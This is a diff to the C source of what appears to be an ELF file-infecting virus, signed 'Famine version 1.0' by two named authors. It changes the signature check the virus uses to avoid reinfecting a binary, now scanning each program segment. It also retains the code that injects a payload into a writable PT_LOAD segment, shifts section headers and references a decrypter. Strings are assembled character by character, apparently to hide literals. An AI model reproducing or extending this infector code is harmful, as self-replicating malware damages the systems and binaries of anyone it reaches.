@@ -47,8 +47,10 @@ struct linux_dirent64 {
  int ft_isallnum(char *str);
  size_t	put_sig(int fd);
  bool	im_infected(char *data);
- bool	is_infected(char *data);
- void decrypter(unsigned long address_of_main);
+ bool	is_infected2(char *data);
+bool is_infected(const char *haystack, size_t n);
+
+		void decrypter(unsigned long address_of_main);
 
  char            *ft_strnstr(char *s1, char *s2, size_t n);
  int             ft_strcmp(const char *s1, const char *s2);
@@ -810,28 +812,7 @@ ft_putchar('\n');
 	ft_putchar('.');
 	ft_putchar('2');
 	ft_putchar('\n');
-	 if(0 && is_infected(buff))
-	 {
-	 	char deja[15];
-	 	deja[0]='d';
-	 	deja[1] ='e';
-	 	deja[2] ='j';
-	 	deja[3] ='a';
-	 	deja[4] =' ' ;
-	 	deja[5] ='i';
-	 	deja[6] ='n';
-	 	deja[7] ='f';
-	 	deja[8] ='e';
-	 	deja[9] ='c';
-	 	deja[10] ='t';
-	 	deja[11] ='e';
-	 	deja[12] ='d';
-	 	deja[13] ='\n';
-	 	deja[14] =0;
-	 	ft_putstr(deja);
-		 return (1);
 
-	 }
 
 	Elf64_Ehdr* hdr;
 	Elf64_Phdr* phdr;
@@ -852,9 +833,34 @@ ft_putchar('\n');
 	hdr->e_shoff += PAGE_SZ64;
 
 	for(int i=0; i < hdr->e_phnum; i++){
+		if(is_infected(buff + phdr[i].p_offset, phdr[i].p_filesz))
+		{
+			char deja[15];
+			deja[0]='d';
+			deja[1] ='e';
+			deja[2] ='j';
+			deja[3] ='a';
+			deja[4] =' ' ;
+			deja[5] ='i';
+			deja[6] ='n';
+			deja[7] ='f';
+			deja[8] ='e';
+			deja[9] ='c';
+			deja[10] ='t';
+			deja[11] ='e';
+			deja[12] ='d';
+			deja[13] ='\n';
+			deja[14] =0;
+			ft_putstr(deja);
+			return (1);
+
+		}
 		if(phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_W)){
+
+
+
 			//puts("text found");
-text = phdr[i].p_offset;
+			text = phdr[i].p_offset;
 
 			text_end = phdr[i].p_offset + phdr[i].p_filesz;
 			payload_vaddr = phdr[i].p_vaddr + phdr[i].p_filesz;
@@ -1064,8 +1070,85 @@ int             ft_strncmp(const char *s1, const char *s2, size_t n)
 		return (0);
 	return (int)((unsigned char)s1[index] - (unsigned char)s2[index]);
 }
-
-bool	is_infected(char *data)
+bool is_infected(const char *haystack, size_t n)
+{
+	unsigned int	i;
+	unsigned int	j;
+	unsigned int	k;
+	char needle[54];
+	needle[0] ='F';
+	needle[1] ='a';
+	needle[2] ='m';
+	needle[3] ='i';
+	needle[4] ='n';
+	needle[5] ='e';
+	needle[6] =' ';
+	needle[7] ='v';
+	needle[8] ='e';
+	needle[9] ='r';
+	needle[10] ='s';
+	needle[11] ='i';
+	needle[12] ='o';
+	needle[13] ='n';
+	needle[14] =' ';
+	needle[15] ='1';
+	needle[16] ='.';
+	needle[17] ='0';
+	needle[18]=' ';
+	needle[19]='(';
+	needle[20]='c';
+	needle[21]=')';
+	needle[22]='o';
+	needle[23]='d';
+	needle[24]='e';
+	needle[25]='d';
+	needle[26]=' ';
+	needle[27]='b';
+	needle[28]='y';
+	needle[29]=' ';
+	needle[30]='<';
+	needle[31]='j';
+	needle[32]='g';
+	needle[33]='o';
+	needle[34]='u';
+	needle[35]='n';
+	needle[36]='a';
+	needle[37]='n';
+	needle[38]='d';
+	needle[39]='>';
+	needle[40]='-';
+	needle[41]='<';
+	needle[42]='a';
+	needle[43]='f';
+	needle[44]='i';
+	needle[45]='o';
+	needle[46]='d';
+	needle[47]='i';
+	needle[48]='e';
+	needle[49]='r';
+	needle[50]='>';
+	needle[51]=' ';
+	needle[52]='-';
+	needle[53]=' ';
+	i = 0;
+	if (!needle[0])
+		return ((char *)haystack);
+	while (n--)
+	{
+		j = i;
+		k = 0;
+		while (haystack[j] == needle[k])
+		{
+			j++;
+			k++;
+			if (!needle[k])
+				return 1;
+		}
+		i++;
+	}
+	return (0);
+}
+bool	is_infected2(char *data)
 {
 	Elf64_Ehdr          *header;
 	char sig[54];
@@ -1146,35 +1229,35 @@ bool	is_infected(char *data)
 	name_enter[15]=0;
 	ft_putstr(name_enter);
 		while(sig[i])
-	{
-		ft_putnbr(i);
-		if (sig[i] !=  *((char *)(data + header->e_entry - SIZE_BEFORE_ENTRY_POINT + i)))
 		{
-			char is_inf[18];
-			is_inf[0]='i';
-			is_inf[1]='s';
-			is_inf[2]=' ';
-			is_inf[3]='i';
-			is_inf[4]='n';
-			is_inf[5]='f';
-			is_inf[6]='e';
-			is_inf[7]='c';
-			is_inf[8]='t';
-			is_inf[9]='e';
-			is_inf[10]='d';
-			is_inf[11]=' ' ;
-			is_inf[12]='r';
-			is_inf[13]='e';
-			is_inf[14]='t';
-			is_inf[15]=' ' ;
-			is_inf[16]='0';
-			is_inf[17]=0;
-			ft_putstr(is_inf);
-			return(0);
+			ft_putnbr(i);
+			if (sig[i] !=  *((char *)(data + header->e_entry - SIZE_BEFORE_ENTRY_POINT + i)))
+			{
+				char is_inf[18];
+				is_inf[0]='i';
+				is_inf[1]='s';
+				is_inf[2]=' ';
+				is_inf[3]='i';
+				is_inf[4]='n';
+				is_inf[5]='f';
+				is_inf[6]='e';
+				is_inf[7]='c';
+				is_inf[8]='t';
+				is_inf[9]='e';
+				is_inf[10]='d';
+				is_inf[11]=' ' ;
+				is_inf[12]='r';
+				is_inf[13]='e';
+				is_inf[14]='t';
+				is_inf[15]=' ' ;
+				is_inf[16]='0';
+				is_inf[17]=0;
+				ft_putstr(is_inf);
+				return(0);
 
+			}
+			i++;
 		}
-		i++;
-	}
 		char name_ret[7];
 	name_ret[0] ='r';
 	name_ret[1]='e';
